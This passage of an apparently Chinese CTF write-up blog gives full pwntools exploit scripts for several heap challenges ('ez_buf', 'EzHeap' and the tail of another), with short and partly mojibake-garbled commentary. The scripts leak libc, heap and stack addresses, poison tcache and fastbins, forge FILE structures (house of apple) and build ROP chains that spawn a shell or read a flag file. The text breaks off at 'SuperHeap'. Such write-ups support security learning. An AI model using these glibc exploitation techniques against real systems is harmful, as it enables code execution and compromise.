:log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, data</span>):<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    sa(<span class="hljs-string">b&#x27;:\n&#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>():<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">size, data</span>):<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    sa(<span class="hljs-string">b&#x27;:\n&#x27;</span>, data)<br><br>sa(<span class="hljs-string">b&#x27;.\n&#x27;</span>, <span class="hljs-string">b&#x27;korey&#x27;</span>)<br><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>edit(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x68</span> + p64(<span class="hljs-number">0xf91</span>))<br><br>add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0xf60</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>show()<br>ru(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c4b78</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>, libc.address)<br><br>add(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>delete()<br>edit(<span class="hljs-number">8</span>, p64(libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x13</span> + p64(libc.address + <span class="hljs-number">0xf03a4</span>))<br><br>sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ez-bufï¼ˆèµ›åï¼‰"><a href="#ez-bufï¼ˆèµ›åï¼‰" class="headerlink" title="ez_bufï¼ˆèµ›åï¼‰"></a>ez_bufï¼ˆèµ›åï¼‰</h2><p>ğŸ‘´æ˜¯æˆ˜çŠ¯ï¼Œæ‡’çš„é€†ç»“æ„ä½“ï¼Œç»“æœå‘ç°10åˆ†é’Ÿå°±æŠŠç»“æ„ä½“æ‰‹æ“å‡ºæ¥äº†</p><p>ç„¶åæ‰“tcache binç®¡ç†å™¨å°±è¡Œäº†</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">syntax</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;proto3&quot;</span><span class="hljs-comment">;</span><br><br>package heybro<span class="hljs-comment">;</span><br>message heybro &#123;<br>  optional bytes whatcon<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">;</span><br>  optional sint64 whattodo<span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-comment">;</span><br>  optional sint64 whatidx<span class="hljs-operator">=</span><span class="hljs-number">3</span><span class="hljs-comment">;</span><br>  optional sint64 whatsize<span class="hljs-operator">=</span><span class="hljs-number">4</span><span class="hljs-comment">;</span><br>  optional int32 whatsthis<span class="hljs-operator">=</span><span class="hljs-number">5</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> ctf_pb2<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;8.147.133.80&#x27;</span>, <span class="hljs-number">23833</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./chal&quot;</span>)<br><br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><br>message = ctf_pb2.heybro()<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">no_action</span>(<span class="hljs-params">msg</span>):<br>    <span class="hljs-keyword">global</span> payload<br>    message.whattodo = <span class="hljs-number">0</span><br>    message.whatcon = msg<br>    payload = message.SerializeToString()<br>    p.sendafter(<span class="hljs-string">b&#x27;\n&#x27;</span>, payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, msg</span>):<br>    <span class="hljs-keyword">global</span> payload<br>    message.whattodo = <span class="hljs-number">1</span><br>    message.whatidx = idx<br>    message.whatcon = msg<br>    payload = message.SerializeToString()<br>    p.sendafter(<span class="hljs-string">b&#x27;\n&#x27;</span>, payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    <span class="hljs-keyword">global</span> payload<br>    message.whattodo = <span class="hljs-number">2</span><br>    message.whatidx = idx<br>    payload = message.SerializeToString()<br>    p.sendafter(<span class="hljs-string">b&#x27;\n&#x27;</span>, payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx, msg ,size, this</span>):<br>    <span class="hljs-keyword">global</span> payload<br>    message.whattodo = <span class="hljs-number">3</span><br>    message.whatidx = idx<br>    message.whatcon = msg<br>    message.whatsize = size<br>    message.whatsthis = this<br>    payload = message.SerializeToString()<br>    p.sendafter(<span class="hljs-string">b&#x27;\n&#x27;</span>, payload)<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br><br><br>show(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;00000000&#x27;</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0x30</span>)<br>ru(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>libc.address = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x21ace0</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>, libc.address)<br><br>delete(<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;00000000&#x27;</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0x30</span>)<br>ru(<span class="hljs-string">b&#x27;Content:&#x27;</span>)<br>heap_base = (u64(rc(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="hljs-number">12</span>) - <span class="hljs-number">0x5000</span><br><br><br>delete(<span class="hljs-number">7</span>)<br>delete(<span class="hljs-number">6</span>)<br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">4</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>add(<span class="hljs-number">7</span>, p64((heap_base+<span class="hljs-number">0xe0</span>)^((heap_base+<span class="hljs-number">0x2000</span>)&gt;&gt;<span class="hljs-number">12</span>)))<br><br>add(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">8</span>, p64(<span class="hljs-number">0</span>) + p64(heap_base+<span class="hljs-number">0x10</span>))<br><br>pay = p64(<span class="hljs-number">0x0000000000000000</span>) + p64(<span class="hljs-number">0x700070000</span>)<br>pay = pay.ljust(<span class="hljs-number">0xa8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]) + p64(heap_base+<span class="hljs-number">0xc0</span>) + p64(<span class="hljs-number">0</span>)<br><br>no_action(pay)<br>pay = p64(<span class="hljs-number">0xfbad1887</span>) + p64(libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="hljs-number">131</span>)*<span class="hljs-number">3</span> + p64(libc.sym[<span class="hljs-string">&#x27;_environ&#x27;</span>]) + p64(libc.sym[<span class="hljs-string">&#x27;_environ&#x27;</span>]+<span class="hljs-number">8</span>)<br>pay += p64(libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="hljs-number">131</span>)*<span class="hljs-number">2</span> + p64(libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="hljs-number">132</span>)<br>pay = pay.ljust(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>no_action(pay)<br>stack = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>pay = p64(stack - <span class="hljs-number">0x608</span>)<br>pay = pay.ljust(<span class="hljs-number">0x70</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>no_action(pay)<br><br><br>leak(<span class="hljs-string">&quot;stack&quot;</span>, stack)<br>leak(<span class="hljs-string">&quot;heap&quot;</span>, heap_base)<br><br><br>pop_rdi = <span class="hljs-number">0x000000000002a3e5</span> + libc.address<br>ret = <span class="hljs-number">0x0000000000029139</span> + libc.address<br>pay =p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))) + p64(ret) + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>pay = pay.ljust(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>no_action(pay)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="EzHeap"><a href="#EzHeap" class="headerlink" title="EzHeap"></a>EzHeap</h2><p>orwçš„æœ‰æº¢å‡ºçš„2.35</p><p>house of appleä¸€æŠŠæ¢­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> bookProto_pb2<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>flag = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;8.147.131.196&#x27;</span>, <span class="hljs-number">42913</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./EzHeap&quot;</span>)<br><br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, data</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, size, data</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    sa(<span class="hljs-string">b&#x27;:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(<span class="hljs-number">0x300</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">0</span>, <span class="hljs-number">0x310</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x308</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x8</span>)<br>heap_base = u64(rc(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="hljs-number">12</span><br><br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x310</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x308</span> + p64(<span class="hljs-number">0x311</span>))<br>add(<span class="hljs-number">0x300</span>,<span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x300</span>,<span class="hljs-string">b&#x27;aaa&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    delete(i)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x300</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br><br>edit(<span class="hljs-number">0</span>, <span class="hljs-number">0x310</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x308</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x8</span>)<br><br>libc.address = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))  - <span class="hljs-number">0x21ace0</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>, libc.address)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x310</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x308</span> + p64(<span class="hljs-number">0x311</span>))<br><br>add(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>delete(<span class="hljs-number">11</span>)<br>delete(<span class="hljs-number">10</span>)<br>delete(<span class="hljs-number">9</span>)<br><br>edit(<span class="hljs-number">7</span>, <span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x48</span> + p64(<span class="hljs-number">0x51</span>) + p64((libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]-<span class="hljs-number">0x30</span>)^((heap_base-<span class="hljs-number">0x2000</span>)&gt;&gt;<span class="hljs-number">12</span>)))<br><br>_IO_file_addr = heap_base + <span class="hljs-number">0x1260</span><br>add(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x30</span> + p64(_IO_file_addr))<br><br>_IO_wfile_jumps = libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>setcontext = libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br><br>pop_rdi = libc.address + <span class="hljs-number">0x000000000002a3e5</span><br>pop_rsi = libc.address + <span class="hljs-number">0x000000000002be51</span><br>pop_rdx_r12 = libc.address + <span class="hljs-number">0x000000000011f2e7</span><br>pop_rax = libc.address + <span class="hljs-number">0x0000000000045eb0</span><br>ret = libc.address + <span class="hljs-number">0x00000000000f9b02</span><br>syscall_ret = libc.address + <span class="hljs-number">0x0000000000091316</span><br>magic = <span class="hljs-number">0x0000000000167420</span> + libc.address<br><br>_fake_wide_data_addr = heap_base + <span class="hljs-number">0xf50</span><br>rop_addr = heap_base+<span class="hljs-number">0xc40</span><br><br>_IO_file = p64(<span class="hljs-number">0</span>) + p64(rop_addr)<br>_IO_file = _IO_file.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>_IO_file += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)<br>_IO_file = _IO_file.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>_IO_file += p64(_fake_wide_data_addr)<br>_IO_file = _IO_file.ljust(<span class="hljs-number">0xd8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>_IO_file += p64(_IO_wfile_jumps)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(_IO_file), _IO_file)<br><br>wide_data = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0xe0</span><br>wide_data += p64(_fake_wide_data_addr + <span class="hljs-number">0xe0</span>)<br>wide_data += <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x60</span> + p64(magic)<br>edit(<span class="hljs-number">2</span>, <span class="hljs-built_in">len</span>(wide_data), wide_data)<br><br>rop = <span class="hljs-string">b&#x27;flag\x00\x00&#x27;</span><br>rop = rop.ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>rop += p64(setcontext + <span class="hljs-number">61</span>)<br>rop = rop.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>rop += p64(rop_addr + <span class="hljs-number">0xb0</span>) + p64(ret)<br>rop += p64(pop_rdi) + p64(rop_addr)<br>rop += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>rop += p64(pop_rax) + p64(<span class="hljs-number">2</span>)<br>rop += p64(syscall_ret)<br><span class="hljs-comment">#read</span><br>rop += p64(pop_rdi) + p64(<span class="hljs-number">3</span>)<br>rop += p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x400</span>)<br>rop += p64(pop_rdx_r12) + p64(<span class="hljs-number">0x50</span>) + p64(<span class="hljs-number">0</span>)<br>rop += p64(pop_rax) + p64(<span class="hljs-number">0</span>)<br>rop += p64(syscall_ret)<br><span class="hljs-comment">#write</span><br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>)<br>rop += p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x400</span>)<br>rop += p64(pop_rdx_r12) + p64(<span class="hljs-number">0x50</span>) + p64(<span class="hljs-number">0</span>)<br>rop += p64(pop_rax) + p64(<span class="hljs-number">1</span>)<br>rop += p64(syscall_ret)<br><br>edit(<span class="hljs-number">3</span>, <span class="hljs-built_in">len</span>(rop), rop)<br>leak(<span class="hljs-string">&quot;heap_base&quot;</span>, heap_base)<br><br>sla(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="SuperHeap"><a href="#SuperHeap" class="headerlink" title="SuperHeap"></a>SuperHeap</h2><p>å“ªä¸ªå¥½äººæƒ³å‡ºæ¥çš„protobuf + base32 + base64</p><p>ä¹Ÿæ˜¯å­˜åœ¨å †æº¢å‡ºï¼Œé€†æ˜ç™½è¾“å…¥æ ¼å¼å°±è¡Œäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 